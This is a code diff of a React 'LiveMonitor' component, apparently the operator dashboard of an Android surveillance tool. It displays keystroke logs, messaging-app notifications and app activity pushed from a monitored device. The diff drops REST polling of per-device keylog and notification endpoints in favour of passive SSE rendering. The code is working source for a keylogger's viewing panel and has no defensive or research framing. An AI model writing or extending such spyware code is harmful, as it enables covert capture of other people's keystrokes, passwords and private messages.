@@ -1,4 +1,4 @@
-import React, { useRef, useEffect, useState, useMemo } from 'react';
+import React, { useRef, useMemo } from 'react';
 
 const APP_COLORS = {
   'com.whatsapp': '#25D366',
@@ -173,62 +173,14 @@ function KeylogFeed({ entries }) {
   );
 }
 
-export default function LiveMonitor({ notifEntries, activityEntries, keylogEntries, device }) {
-  const [fetchedKeylogs, setFetchedKeylogs] = useState([]);
-  const [fetchedNotifs, setFetchedNotifs]   = useState([]);
-
-  const deviceId = device?.deviceId;
-  const isOnline = device?.isOnline;
-
-  // ── Fetch keylogs from REST cache on connect, then every 10 s ───────
-  useEffect(() => {
-    if (!isOnline || !deviceId) return;
-    const load = () =>
-      fetch(`/api/data/${deviceId}/keylogs?limit=200`)
-        .then(r => r.json())
-        .then(d => { if (d.logs) setFetchedKeylogs(d.logs); })
-        .catch(() => {});
-    load();
-    const id = setInterval(load, 10000);
-    return () => clearInterval(id);
-  }, [isOnline, deviceId]);
-
-  // ── Fetch notifications from REST cache on connect, then every 15 s ─
-  useEffect(() => {
-    if (!isOnline || !deviceId) return;
-    const load = () =>
-      fetch(`/api/data/${deviceId}/notifications?limit=100`)
-        .then(r => r.json())
-        .then(d => {
-          if (d.notifications) setFetchedNotifs(prev => {
-            const combined = [...d.notifications, ...prev];
-            const seen = new Set();
-            return combined.filter(n => {
-              const key = `${n.packageName}|${n.postTime || n.timestamp}|${n.title}|${n.text}`;
-              if (seen.has(key)) return false;
-              seen.add(key);
-              return true;
-            }).slice(0, 100);
-          });
-        })
-        .catch(() => {});
-    load();
-    const id = setInterval(load, 15000);
-    return () => clearInterval(id);
-  }, [isOnline, deviceId]);
-
-  // ── Merge push + fetched, dedupe ────────────────────────────────────
-  const notifs = useMemo(() =>
-    dedupeNotifs([...(notifEntries || []), ...fetchedNotifs]).slice(0, 100),
-    [notifEntries, fetchedNotifs]
-  );
-
+// LiveMonitor is purely passive — it renders only what the Android app pushes
+// in real time via SSE. No fetching, no polling, no commands are sent.
+// Data arrives through: keylog:push → keylogEntries, notification:push → notifEntries,
+// activity:app_open → activityEntries (all streamed from App.jsx via SSE).
+export default function LiveMonitor({ notifEntries, activityEntries, keylogEntries }) {
+  const notifs   = useMemo(() => dedupeNotifs(notifEntries   || []).slice(0, 100), [notifEntries]);
   const activity = (activityEntries || []).slice(0, 100);
-
-  const keylogs = useMemo(() =>
-    dedupeKeylogs([...(keylogEntries || []), ...fetchedKeylogs]).slice(0, 200),
-    [keylogEntries, fetchedKeylogs]
-  );
+  const keylogs  = useMemo(() => dedupeKeylogs(keylogEntries || []).slice(0, 200), [keylogEntries]);
 
   return (
     <div className="live-monitor">
